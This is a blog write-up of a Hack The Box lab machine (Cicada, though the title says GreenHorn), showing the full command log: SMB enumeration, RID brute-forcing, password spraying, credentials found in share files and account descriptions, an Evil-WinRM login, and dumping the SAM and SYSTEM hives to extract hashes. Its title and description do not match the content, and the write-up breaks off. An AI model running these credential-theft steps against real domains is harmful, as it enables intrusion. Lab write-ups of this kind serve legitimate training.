---
layout: post
title: Hackthebox GreenHorn Machine Writeup
tags: [Revershell Recon]
description: Detailed writeup of [PermX](https://www.hackthebox.com/machines/cicada)
---



<div style="display: flex; justify-content: center;">
  <img src="/assets/HTB/banner.png" alt="HTB Banner" style="max-width: 100%; height: auto; text-align: center;">
</div>


### overview

Greenhorn is a beginner-friendly machine. Starting with credential harvesting to revershell upload & then trying with pdf extraction.

- OS Wndows
- Point's 20

####
Initial reconnaissance of the target machine revealed a domain controller through comprehensive Nmap scanning. Exploring the SMB service anonymously uncovered a critical /HR directory containing a recruitment notice with potential credential insights. Employing enumeration tools like enum4linux and nxc, I systematically mapped user accounts and validated potential entry points. Kerbrute assisted in username verification, ultimately leveraging discovered credentials to establish initial access. This methodical approach provided a strategic foothold for further privilege escalation and comprehensive system exploration within the controlled Hack The Box environment.



##### Nmap Scan 
```
┌──(root㉿kali)-[/home/angrybird/Desktop/Openvpn]
└─# nmap -sC -sV -Pn -A 10.10.11.35
Nmap scan report for 10.10.11.35
Host is up (0.30s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-11-15 01:32:28Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: TLS randomness does not represent time
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: TLS randomness does not represent time
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: TLS randomness does not represent time
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: TLS randomness does not represent time
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022 (88%)
Aggressive OS guesses: Microsoft Windows Server 2022 (88%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-11-15T01:33:26
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 7h00m00s

TRACEROUTE (using port 445/tcp)
HOP RTT       ADDRESS
1   354.29 ms 10.10.16.1
2   354.74 ms 10.10.11.35

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 126.87 seconds
```

After seeing Nmap scan i thought of checking Open shares, Users list So that i used **nxc** which is updated to crackmapexc.

``` 
┌──(root㉿kali)-[/home/angrybird/Desktop/Openvpn]
└─# nxc  smb cicada.htb -u 'guest'  -p '' --shares
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\guest: 
SMB         10.10.11.35     445    CICADA-DC        [*] Enumerated shares
SMB         10.10.11.35     445    CICADA-DC        Share           Permissions     Remark
SMB         10.10.11.35     445    CICADA-DC        -----           -----------     ------
SMB         10.10.11.35     445    CICADA-DC        ADMIN$                          Remote Admin
SMB         10.10.11.35     445    CICADA-DC        C$                              Default share
SMB         10.10.11.35     445    CICADA-DC        DEV                             
SMB         10.10.11.35     445    CICADA-DC        HR              READ            
SMB         10.10.11.35     445    CICADA-DC        IPC$            READ            Remote IPC
SMB         10.10.11.35     445    CICADA-DC        NETLOGON                        Logon server share 
SMB         10.10.11.35     445    CICADA-DC        SYSVOL                          Logon server share 
```
In this HR Having read access to few files, Let's view those.
```
──(root㉿kali)-[/home/angrybird/Desktop/Openvpn]
└─# smbclient //cicada.htb/HR -N
smb: \> LS
  .                                   D        0  Thu Mar 14 17:59:09 2024
  ..                                  D        0  Thu Mar 14 17:51:29 2024
  Notice from HR.txt                  A     1266  Wed Aug 28 23:01:48 2024

smb: \> get  Notice from HR.txt  
NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \Notice 
```
```
──(root㉿kali)-[/home/angrybird/Desktop/Openvpn]
└─# cat Notice\ from\ HR.txt 

Dear new hire!

Welcome to Cicada Corp! We're thrilled to have you join our team. As part of our security protocols, it's essential that you change your default password to something unique and secure.

Your default password is: ***********************
To change your password:

1. Log in to your Cicada Corp account** using the provided username and the default password mentioned above.
2. Once logged in, navigate to your account settings or profile settings section.
3. Look for the option to change your password. This will be labeled as "Change Password".
4. Follow the prompts to create a new password**. Make sure your new password is strong, containing a mix of uppercase letters, lowercase letters, numbers, and special characters.
5. After changing your password, make sure to save your changes.

Remember, your password is a crucial aspect of keeping your account secure. Please do not share your password with anyone, and ensure you use a complex password.

If you encounter any issues or need assistance with changing your password, don't hesitate to reach out to our support team at support@cicada.htb.

Thank you for your attention to this matter, and once again, welcome to the Cicada Corp team!

Best regards,
Cicada Corp
```

I found a password in HR.txt But now i don't know username linked to password, So that i started to bruteforce all username using rid-brute.

```
┌──(angrybird㉿kali)-[~/Desktop/Openvpn]
└─$ nxc smb cicada.htb -u "guest" -p '' --rid-brute | grep SidTypeUser
SMB                      10.10.11.35     445    CICADA-DC        500: CICADA\Administrator (SidTypeUser)
SMB                      10.10.11.35     445    CICADA-DC        501: CICADA\Guest (SidTypeUser)
SMB                      10.10.11.35     445    CICADA-DC        502: CICADA\krbtgt (SidTypeUser)
SMB                      10.10.11.35     445    CICADA-DC        1000: CICADA\CICADA-DC$ (SidTypeUser)
SMB                      10.10.11.35     445    CICADA-DC        1104: CICADA\john.smoulder (SidTypeUser)
SMB                      10.10.11.35     445    CICADA-DC        1105: CICADA\sarah.dantelia (SidTypeUser)
SMB                      10.10.11.35     445    CICADA-DC        1106: CICADA\michael.wrightson (SidTypeUser)
SMB                      10.10.11.35     445    CICADA-DC        1108: CICADA\david.orelious (SidTypeUser)
SMB                      10.10.11.35     445    CICADA-DC        1601: CICADA\emily.oscars (SidTypeUser)
```

```
┌──(angrybird㉿kali)-[~/Desktop/Openvpn]
└─$ nano username.txt                
Administrator
Guest
krbtgt
CICADA-DC$
john.smoulder
sarah.dantelia
michael.wrightson
david.orelious
emily.oscars
```
Let's bruteforce password to usernames. 
```
                                                                                                                                                              
┌──(angrybird㉿kali)-[~/Desktop/Openvpn]
└─$ nxc smb cicada.htb -u usernames.txt -p '***************************'
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\Administrator:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\Guest:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\krbtgt:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\CICADA-DC$:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\john.smoulder:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\sarah.dantelia:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
                                                                                                                                                              
```




```
┌──(angrybird㉿kali)-[~/Desktop/Openvpn]
└─$ enum4linux -a -A -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' cicada.htb
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Fri Nov 15 18:33:47 2024

 =========================================( Target Information )=========================================

Target ........... cicada.htb
RID Range ........ 500-550,1000-1050
Username ......... 'michael.wrightson'
Password ......... 'Cicada$M6Corpb*@Lp#nZp!8'
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none

 =================================( Nbtstat Information for cicada.htb )=================================

Looking up status of 10.10.11.35
No reply from 10.10.11.35

 ====================================( OS information on cicada.htb )====================================


[E] Can't get OS info with smbclient


[+] Got OS info for cicada.htb from srvinfo: 
	CICADA.HTB     Wk Sv PDC Tim NT     CICADA-DC
	platform_id     :	500
	os version      :	10.0
	server type     :	0x80102b


 ========================================( Users on cicada.htb )========================================

index: 0xeda RID: 0x1f4 acb: 0x00000210 Account: Administrator	Name: (null)	Desc: Built-in account for administering the computer/domain
index: 0xfeb RID: 0x454 acb: 0x00000210 Account: david.orelious	Name: (null)	Desc: Just in case I forget my password is aRt$Lp#7t*VQ!3
index: 0x101d RID: 0x641 acb: 0x00000210 Account: emily.oscars	Name: Emily Oscars	Desc: (null)
index: 0xedb RID: 0x1f5 acb: 0x00000214 Account: Guest	Name: (null)	Desc: Built-in account for guest access to the computer/domain
index: 0xfe7 RID: 0x450 acb: 0x00000210 Account: john.smoulder	Name: (null)	Desc: (null)
index: 0xf10 RID: 0x1f6 acb: 0x00020011 Account: krbtgt	Name: (null)	Desc: Key Distribution Center Service Account
index: 0xfe9 RID: 0x452 acb: 0x00000210 Account: michael.wrightson	Name: (null)	Desc: (null)
index: 0xfe8 RID: 0x451 acb: 0x00000210 Account: sarah.dantelia	Name: (null)	Desc: (null)

user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[john.smoulder] rid:[0x450]
user:[sarah.dantelia] rid:[0x451]
user:[michael.wrightson] rid:[0x452]
user:[david.orelious] rid:[0x454]
user:[emily.oscars] rid:[0x641]

 ==================================( Share Enumeration on cicada.htb )==================================

do_connect: Connection to cicada.htb failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	DEV             Disk      
	HR              Disk      
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on cicada.htb

//cicada.htb/ADMIN$	Mapping: DENIED Listing: N/A Writing: N/A
//cicada.htb/C$	Mapping: DENIED Listing: N/A Writing: N/A
testing write access DEV
//cicada.htb/DEV	Mapping: OK Listing: DENIED Writing: DENIED
testing write access HR
//cicada.htb/HR	Mapping: OK Listing: OK Writing: DENIED

[E] Can't understand response:

NT_STATUS_NO_SUCH_FILE listing \*
//cicada.htb/IPC$	Mapping: N/A Listing: N/A Writing: N/A
testing write access NETLOGON
//cicada.htb/NETLOGON	Mapping: OK Listing: OK Writing: DENIED
testing write access SYSVOL
//cicada.htb/SYSVOL	Mapping: OK Listing: OK Writing: DENIED

 =============================( Password Policy Information for cicada.htb )=============================



[+] Attaching to cicada.htb using michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8

[+] Trying protocol 139/SMB...

	[!] Protocol failed: Cannot request session (Called Name:CICADA.HTB)

[+] Trying protocol 445/SMB...

[+] Found domain(s):

	[+] CICADA
	[+] Builtin

[+] Password Info for Domain: CICADA

	[+] Minimum password length: 7
	[+] Password history length: 24
	[+] Maximum password age: 41 days 23 hours 53 minutes 
	[+] Password Complexity Flags: 000001

		[+] Domain Refuse Password Change: 0
		[+] Domain Password Store Cleartext: 0
		[+] Domain Password Lockout Admins: 0
		[+] Domain Password No Clear Change: 0
		[+] Domain Password No Anon Change: 0
		[+] Domain Password Complex: 1

	[+] Minimum password age: 1 day 4 minutes 
	[+] Reset Account Lockout Counter: 30 minutes 
	[+] Locked Account Duration: 30 minutes 
	[+] Account Lockout Threshold: None
	[+] Forced Log off Time: Not Set



[+] Retieved partial password policy with rpcclient:


Password Complexity: Enabled
Minimum Password Length: 7


 ========================================( Groups on cicada.htb )========================================


[+] Getting builtin groups:

group:[Administrators] rid:[0x220]
group:[Users] rid:[0x221]
group:[Guests] rid:[0x222]
group:[Print Operators] rid:[0x226]
group:[Backup Operators] rid:[0x227]
group:[Replicator] rid:[0x228]
group:[Remote Desktop Users] rid:[0x22b]
group:[Network Configuration Operators] rid:[0x22c]
group:[Performance Monitor Users] rid:[0x22e]
group:[Performance Log Users] rid:[0x22f]
group:[Distributed COM Users] rid:[0x232]
group:[IIS_IUSRS] rid:[0x238]
group:[Cryptographic Operators] rid:[0x239]
group:[Event Log Readers] rid:[0x23d]
group:[Certificate Service DCOM Access] rid:[0x23e]
group:[RDS Remote Access Servers] rid:[0x23f]
group:[RDS Endpoint Servers] rid:[0x240]
group:[RDS Management Servers] rid:[0x241]
group:[Hyper-V Administrators] rid:[0x242]
group:[Access Control Assistance Operators] rid:[0x243]
group:[Remote Management Users] rid:[0x244]
group:[Storage Replica Administrators] rid:[0x246]
group:[Server Operators] rid:[0x225]
group:[Account Operators] rid:[0x224]
group:[Pre-Windows 2000 Compatible Access] rid:[0x22a]
group:[Incoming Forest Trust Builders] rid:[0x22d]
group:[Windows Authorization Access Group] rid:[0x230]
group:[Terminal Server License Servers] rid:[0x231]

[+]  Getting builtin group memberships:

Group: Guests' (RID: 546) has member: CICADA\Guest
Group: Guests' (RID: 546) has member: CICADA\Domain Guests
Group: Users' (RID: 545) has member: NT AUTHORITY\INTERACTIVE
Group: Users' (RID: 545) has member: NT AUTHORITY\Authenticated Users
Group: Users' (RID: 545) has member: CICADA\Domain Users
Group: Backup Operators' (RID: 551) has member: CICADA\Dev Support
Group: Backup Operators' (RID: 551) has member: CICADA\emily.oscars
Group: Remote Management Users' (RID: 580) has member: CICADA\emily.oscars
Group: Pre-Windows 2000 Compatible Access' (RID: 554) has member: NT AUTHORITY\Authenticated Users
Group: Windows Authorization Access Group' (RID: 560) has member: NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERS
Group: IIS_IUSRS' (RID: 568) has member: NT AUTHORITY\IUSR
Group: Certificate Service DCOM Access' (RID: 574) has member: NT AUTHORITY\Authenticated Users
Group: Administrators' (RID: 544) has member: CICADA\Administrator
Group: Administrators' (RID: 544) has member: CICADA\Enterprise Admins
Group: Administrators' (RID: 544) has member: CICADA\Domain Admins

[+]  Getting local groups:

group:[Cert Publishers] rid:[0x205]
group:[RAS and IAS Servers] rid:[0x229]
group:[Allowed RODC Password Replication Group] rid:[0x23b]
group:[Denied RODC Password Replication Group] rid:[0x23c]
group:[DnsAdmins] rid:[0x44d]

[+]  Getting local group memberships:

Group: Denied RODC Password Replication Group' (RID: 572) has member: CICADA\krbtgt
Group: Denied RODC Password Replication Group' (RID: 572) has member: CICADA\Domain Controllers
Group: Denied RODC Password Replication Group' (RID: 572) has member: CICADA\Schema Admins
Group: Denied RODC Password Replication Group' (RID: 572) has member: CICADA\Enterprise Admins
Group: Denied RODC Password Replication Group' (RID: 572) has member: CICADA\Cert Publishers
Group: Denied RODC Password Replication Group' (RID: 572) has member: CICADA\Domain Admins
Group: Denied RODC Password Replication Group' (RID: 572) has member: CICADA\Group Policy Creator Owners
Group: Denied RODC Password Replication Group' (RID: 572) has member: CICADA\Read-only Domain Controllers

[+]  Getting domain groups:

group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[Enterprise Key Admins] rid:[0x20f]
group:[DnsUpdateProxy] rid:[0x44e]
group:[Groups] rid:[0x44f]
group:[Dev Support] rid:[0x455]

[+]  Getting domain group memberships:

Group: 'Domain Admins' (RID: 512) has member: CICADA\Administrator
Group: 'Domain Users' (RID: 513) has member: CICADA\Administrator
Group: 'Domain Users' (RID: 513) has member: CICADA\krbtgt
Group: 'Domain Users' (RID: 513) has member: CICADA\john.smoulder
Group: 'Domain Users' (RID: 513) has member: CICADA\sarah.dantelia
Group: 'Domain Users' (RID: 513) has member: CICADA\michael.wrightson
Group: 'Domain Users' (RID: 513) has member: CICADA\david.orelious
Group: 'Domain Users' (RID: 513) has member: CICADA\emily.oscars
Group: 'Domain Guests' (RID: 514) has member: CICADA\Guest
Group: 'Schema Admins' (RID: 518) has member: CICADA\Administrator
Group: 'Group Policy Creator Owners' (RID: 520) has member: CICADA\Administrator
Group: 'Domain Controllers' (RID: 516) has member: CICADA\CICADA-DC$
Group: 'Enterprise Admins' (RID: 519) has member: CICADA\Administrator

 ===================( Users on cicada.htb via RID cycling (RIDS: 500-550,1000-1050) )===================


[I] Found new SID: 
S-1-5-21-917908876-1423158569-3159038727

[I] Found new SID: 
S-1-5-21-917908876-1423158569-3159038727

[I] Found new SID: 
S-1-5-32

[I] Found new SID: 
S-1-5-32

[I] Found new SID: 
S-1-5-32

[I] Found new SID: 
S-1-5-32

[I] Found new SID: 
S-1-5-32

[I] Found new SID: 
S-1-5-32

[I] Found new SID: 
S-1-5-32

[I] Found new SID: 
S-1-5-21-917908876-1423158569-3159038727

[I] Found new SID: 
S-1-5-21-917908876-1423158569-3159038727

[+] Enumerating users using SID S-1-5-90 and logon username 'michael.wrightson', password 'Cicada$M6Corpb*@Lp#nZp!8'


[+] Enumerating users using SID S-1-5-80 and logon username 'michael.wrightson', password 'Cicada$M6Corpb*@Lp#nZp!8'


[+] Enumerating users using SID S-1-5-21-47050115-2771739599-2321771406 and logon username 'michael.wrightson', password 'Cicada$M6Corpb*@Lp#nZp!8'

S-1-5-21-47050115-2771739599-2321771406-500 CICADA-DC\Administrator (Local User)
S-1-5-21-47050115-2771739599-2321771406-501 CICADA-DC\Guest (Local User)
S-1-5-21-47050115-2771739599-2321771406-503 CICADA-DC\DefaultAccount (Local User)
S-1-5-21-47050115-2771739599-2321771406-504 CICADA-DC\WDAGUtilityAccount (Local User)
S-1-5-21-47050115-2771739599-2321771406-513 CICADA-DC\None (Domain Group)

[+] Enumerating users using SID S-1-5-21-917908876-1423158569-3159038727 and logon username 'michael.wrightson', password 'Cicada$M6Corpb*@Lp#nZp!8'

S-1-5-21-917908876-1423158569-3159038727-500 CICADA\Administrator (Local User)
S-1-5-21-917908876-1423158569-3159038727-501 CICADA\Guest (Local User)
S-1-5-21-917908876-1423158569-3159038727-502 CICADA\krbtgt (Local User)
S-1-5-21-917908876-1423158569-3159038727-512 CICADA\Domain Admins (Domain Group)
S-1-5-21-917908876-1423158569-3159038727-513 CICADA\Domain Users (Domain Group)
S-1-5-21-917908876-1423158569-3159038727-514 CICADA\Domain Guests (Domain Group)
S-1-5-21-917908876-1423158569-3159038727-515 CICADA\Domain Computers (Domain Group)
S-1-5-21-917908876-1423158569-3159038727-516 CICADA\Domain Controllers (Domain Group)
S-1-5-21-917908876-1423158569-3159038727-517 CICADA\Cert Publishers (Local Group)
S-1-5-21-917908876-1423158569-3159038727-518 CICADA\Schema Admins (Domain Group)
S-1-5-21-917908876-1423158569-3159038727-519 CICADA\Enterprise Admins (Domain Group)
S-1-5-21-917908876-1423158569-3159038727-520 CICADA\Group Policy Creator Owners (Domain Group)
S-1-5-21-917908876-1423158569-3159038727-521 CICADA\Read-only Domain Controllers (Domain Group)
S-1-5-21-917908876-1423158569-3159038727-522 CICADA\Cloneable Domain Controllers (Domain Group)
S-1-5-21-917908876-1423158569-3159038727-525 CICADA\Protected Users (Domain Group)
S-1-5-21-917908876-1423158569-3159038727-526 CICADA\Key Admins (Domain Group)
S-1-5-21-917908876-1423158569-3159038727-527 CICADA\Enterprise Key Admins (Domain Group)
S-1-5-21-917908876-1423158569-3159038727-1000 CICADA\CICADA-DC$ (Local User)

[+] Enumerating users using SID S-1-5-80-3139157870-2983391045-3678747466-658725712 and logon username 'michael.wrightson', password 'Cicada$M6Corpb*@Lp#nZp!8'


[+] Enumerating users using SID S-1-5-32 and logon username 'michael.wrightson', password 'Cicada$M6Corpb*@Lp#nZp!8'




┌──(root㉿kali)-[/home/angrybird/Desktop/Openvpn]
└─# smbclient //CICADA.HTB/DEV -U david.orelious
Password for [WORKGROUP\david.orelious]:
Try "help" to get a list of possible commands.
smb: \> LS
  .                                   D        0  Thu Mar 14 18:01:39 2024
  ..                                  D        0  Thu Mar 14 17:51:29 2024
  Backup_script.ps1                   A      601  Wed Aug 28 22:58:22 2024

		4168447 blocks of size 4096. 413454 blocks available
smb: \> get Backup_script.ps1
getting file \Backup_script.ps1 of size 601 as Backup_script.ps1 (0.6 KiloBytes/sec) (average 0.6 KiloBytes/sec)
smb: \>




                                                                              
┌──(angrybird㉿kali)-[~/Desktop/Openvpn]
└─$ cat  Backup_script.ps1           

$sourceDirectory = "C:\smb"
$destinationDirectory = "D:\Backup"

$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
$dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"
$backupFileName = "smb_backup_$dateStamp.zip"
$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName
Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"
                                                                              
┌──(angrybird㉿kali)-[~/Desktop/Openvpn]
└─$ 






┌──(root㉿kali)-[/home/angrybird/Desktop/Openvpn]
└─# nmap -Pn 10.10.11.35 -p 5985
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-15 19:25 IST
Nmap scan report for cicada.htb (10.10.11.35)
Host is up (0.27s latency).

PORT     STATE SERVICE
5985/tcp open  wsman

Nmap done: 1 IP address (1 host up) scanned in 0.50 seconds






                                                                              
┌──(angrybird㉿kali)-[~/Desktop]
└─$ evil-winrm -i cicada.htb -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> ls
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> cd ..
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA> cd Desktop
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> ls


    Directory: C:\Users\emily.oscars.CICADA\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---        11/15/2024   3:01 PM             34 user.txt


*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> cat user.txt
e896b9a0f0eee558675ac7601711c27d
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> 










┌──(angrybird㉿kali)-[~/Desktop]
└─$ evil-winrm -i cicada.htb -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> cd c:\
*Evil-WinRM* PS C:\> ls


    Directory: C:\


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         8/22/2024  11:45 AM                PerfLogs
d-r---         8/29/2024  12:32 PM                Program Files
d-----          5/8/2021   2:40 AM                Program Files (x86)
d-----         3/14/2024   5:21 AM                Shares
d-----        11/15/2024   3:39 PM                temp
d-r---         8/26/2024   1:11 PM                Users
d-----         9/23/2024   9:35 AM                Windows


*Evil-WinRM* PS C:\> -a----        11/15/2024   1:53 PM          49152 sam.save 
The term '-a----' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
At line:1 char:1
+ -a----        11/15/2024   1:53 PM          49152 sam.save
+ ~~~~~~
    + CategoryInfo          : ObjectNotFound: (-a----:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException
^C
                                        
Warning: Press "y" to exit, press any other key to continue

y
*Evil-WinRM* PS C:\> 
*Evil-WinRM* PS C:\> y
The term 'y' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
At line:1 char:1
+ y
+ ~
    + CategoryInfo          : ObjectNotFound: (y:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException
*Evil-WinRM* PS C:\> reg save hklm\sam c:\temp\sam
The operation completed successfully.

*Evil-WinRM* PS C:\> reg save hklm\system c:\temp\system
The operation completed successfully.

*Evil-WinRM* PS C:\> download sam
                                        
Info: Downloading C:\\sam to sam
                                        
Error: Download failed. Check filenames or paths
*Evil-WinRM* PS C:\> cd temp
*Evil-WinRM* PS C:\temp> ls


    Directory: C:\temp


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        11/15/2024   4:27 PM          49152 sam
-a----        11/15/2024   4:28 PM       18518016 system


d*Evil-WinRM* PS C:\temp> download sam
                                        
Info: Downloading C:\temp\sam to sam
                                        
Info: Download successful!
*Evil-WinRM* PS C:\temp> download system
                                        
Info: Downloading C:\temp\system to system
                                          
Info: Download successful!
*Evil-WinRM* PS C:\temp> exit
^C
                                        
Warning: Press "y" to exit, press any other key to continue
                                        
Info: Exiting...

                                        
Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError
                                        
Error: Exiting with code 1
                                                                               
┌──(angrybird㉿kali)-[~/Desktop]
└─$ 
                                                                               
┌──(angrybird㉿kali)-[~/Desktop]
└─$ ls
'HTB - Machines'   jwt-cracker   req.py
 KeyLogger         jwt_tool      req1.py
 Openvpn           new.gpr       req111.py
 ParamSpider       new.lock      rockyou.txt
 Project           new.lock~     sam
 SubNinja          new.rep       subdomains-top1million-5000.txt
 doubletake.jpg    pavxn.gpr     system
 idafree-8.4       pwn.txt       unpickle_script.py
                                                                               
┌──(angrybird㉿kali)-[~/Desktop]
└─$ ls -la
total 155024
drwxr-xr-x 12 angrybird angrybird      4096 Nov 15 23:00  .
drwx------ 35 angrybird angrybird      4096 Nov 15 21:10  ..
drwxrwxr-x  7 angrybird adm           12288 Oct 19 00:33 'HTB - Machines'
drwxr-xr-x  2 angrybird angrybird      4096 Jun  8 23:19  KeyLogger
drwxrwxr-x  3 angrybird angrybird      4096 Nov 15 19:19  Openvpn
drwxrwxr-x  8 angrybird angrybird      4096 Aug  9 23:38  ParamSpider
drwxrwxr-x  4 angrybird angrybird      4096 Nov  9 15:59  Project
drwxrwxrwx  3 angrybird angrybird      4096 Apr  4  2024  SubNinja
-rwxrw-rw-  1 angrybird angrybird    126989 Jul  2 23:50  doubletake.jpg
drwxrwxr-x 12 angrybird angrybird      4096 Aug 10 14:55  idafree-8.4
drwxrwxr-x  6 angrybird angrybird      4096 Aug 10 15:42  jwt-cracker
drwxrwxr-x  4 angrybird angrybird      4096 Aug 10 19:58  jwt_tool
-rw-r-----  1 angrybird angrybird         0 Nov  2 10:17  new.gpr
-rw-r-----  1 angrybird angrybird       227 Nov  2 10:17  new.lock
-rw-r-----  1 angrybird angrybird         0 Nov  2 10:17  new.lock~
drwxr-x---  5 angrybird angrybird      4096 Nov  2 10:18  new.rep
